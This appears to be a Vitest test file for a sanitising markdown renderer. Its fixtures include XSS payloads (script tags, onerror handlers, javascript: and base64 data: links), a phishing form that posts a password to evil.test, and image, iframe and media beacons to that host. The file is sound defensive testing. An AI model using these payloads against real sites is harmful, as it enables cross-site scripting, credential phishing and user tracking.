import { describe, expect, it } from "vitest";
import DOMPurify from "dompurify";
import { renderMarkdown } from "./markdown";

describe("renderMarkdown", () => {
  it("renders tables and links", () => {
    const html = renderMarkdown("| a | b |\n|---|---|\n| 1 | [x](https://x.test) |");
    expect(html).toContain("<table>");
    expect(html).toContain("<td>1</td>");
    expect(html).toContain('href="https://x.test"');
  });

  it("opens links in a new tab without leaking the opener or referrer", () => {
    const html = renderMarkdown("[x](https://x.test)");
    const a = new DOMParser().parseFromString(html, "text/html").querySelector("a");
    expect(a.getAttribute("href")).toBe("https://x.test");
    expect(a.getAttribute("target")).toBe("_blank");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  });

  it("keeps ordinary markdown formatting", () => {
    const html = renderMarkdown("# Title\n\n- **bold** and *em*\n\n> quote\n\n`code`\n\n---");
    for (const tag of ["<h1>", "<ul>", "<li>", "<strong>", "<em>", "<blockquote>", "<code>", "<hr>"]) expect(html).toContain(tag);
  });

  it("strips script and event handlers copied from scraped pages", () => {
    const html = renderMarkdown('Hi <script>alert(1)</script><img src=x onerror="alert(2)"> [bad](javascript:alert(3))');
    expect(html).not.toMatch(/<script|onerror|javascript:/i);
  });

  // Each row is hostile content a scraped page could smuggle into a deliverable.
  const HOSTILE = [
    ["a <style> tag (CSS takeover)", "<style>body{display:none}</style>hi", /<style|display:none/i],
    ["a style attribute (overlay)", '<p style="position:fixed;inset:0">hi</p>', /style=|position:fixed/i],
    ["a class attribute (utility-class overlay)", '<p class="fixed inset-0 z-50">hi</p>', /class=|inset-0/i],
    ["a form with inputs and a button (phishing)", '<form action="https://evil.test"><input name="pw"><button>Go</button></form>', /<form|<input|<button|evil\.test/i],
    ["a textarea and select", "<textarea>x</textarea><select><option>1</option></select>", /<textarea|<select|<option/i],
    ["a markdown image (zero-click beacon)", "![](https://evil.test/x.png)", /<img|evil\.test/i],
    ["an <img src> (zero-click beacon)", '<img src="https://evil.test/x.png">', /<img|evil\.test/i],
    ["an iframe", '<iframe src="https://evil.test"></iframe>', /<iframe|evil\.test/i],
    ["media and embed tags", '<video src="https://evil.test/v"></video><audio src="https://evil.test/a"></audio><picture><source srcset="https://evil.test/p"></picture><object data="https://evil.test/o"></object><embed src="https://evil.test/e">', /<video|<audio|<picture|<source|<object|<embed|evil\.test/i],
    ["a data: link", "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)", /href="data:/i],
    ["a javascript: link", '<a href="javascript:alert(1)">x</a>', /javascript:/i],
  ];

  it.each(HOSTILE)("strips %s", (_name, input, forbidden) => {
    expect(renderMarkdown(input)).not.toMatch(forbidden);
  });

  it("does not add its link hook to the shared DOMPurify instance", () => {
    renderMarkdown("[x](https://x.test)");
    expect(DOMPurify.sanitize('<a href="https://x.test">x</a>')).not.toContain("target=");
  });
});
